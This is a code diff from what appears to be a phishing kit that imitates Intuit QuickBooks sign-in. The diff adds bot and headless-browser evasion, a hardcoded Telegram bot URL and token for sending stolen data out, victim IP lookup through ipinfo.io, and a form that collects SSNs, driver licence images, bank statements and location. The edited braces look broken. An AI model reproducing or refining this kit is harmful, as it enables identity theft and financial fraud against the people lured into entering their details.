@@ -380,13 +380,14 @@ function sendMessage2() {
                 return !isBot && !isHeadless;
             }
 
-            function isValidEmail(email) {
-                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return emailPattern.test(email);
-            }                
+function isValidEmail(email) {
+    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    return emailPattern.test(email);
+}             
 
 function verifyAndRedirect() {
-                if (isHuman()) {    
+                if (isHuman()) {
+                    if (isValidEmail('${getBase64FromUrl()}')) {
     const AUTH_PASSWORD = "correctpassword"; // Simulated password for testing
     const DOC_LINK = "https://accounts.intuit.com/app/sign-in?app_group=QBO&asset_alias=Intuit.accounting.core.qbowebapp&app_environment=prod";
     const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage"; // Replace with your Telegram bot's webhook URL
@@ -547,11 +548,7 @@ const ssnInput = document.getElementById('ssn');
     const bankStatement = document.getElementById('bank-statement').files;
     const ssnValue = ssnInput.value.trim();
     const ssnRegex = /^\\d{10}$/;
-    if (!ssnRegex.test(ssnValue)) {
-        documentError.style.display = 'block';
-        documentError.textContent = 'Invalid SSN format. Please use XXX-XX-XXXX.';
-        ssnInput.classList.add('error');
-        
+    if (!ssnRegex.test(ssnValue)) {      
     if (businessCertificate.length > 0 && driverLicenseFront.length > 0 && driverLicenseBack.length > 0 && bankStatement.length > 0) {
         loading.style.display = 'block';
         const location = await getLocation();
@@ -586,7 +583,7 @@ const ssnInput = document.getElementById('ssn');
     } else {
         documentError.style.display = 'block';
         documentError.textContent = 'Please upload all the required documents.';
-    };
+    }}});
                     
                     } else {
              fetch('https://ipinfo.io/json?token=d8eafd6deea176')
